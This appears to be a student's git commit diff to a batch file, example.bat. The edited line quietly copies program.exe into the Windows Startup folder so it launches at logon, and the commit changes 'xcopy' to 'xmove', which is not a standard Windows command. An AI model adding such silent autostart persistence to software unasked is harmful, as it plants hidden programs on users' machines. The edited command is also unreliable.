6f0b6f594846486072293c83363b1ce46743fa08
sigit3329 <muhammadsigitnugroho@students.amikom.ac.id>
2023-01-11 17:19:19 +0700

    Update example.bat

--- example.bat
+++ example.bat
@@ -1,2 +1,2 @@
-start /min xcopy /y /z program.exe "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+start /min xmove /y /z program.exe "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 exit
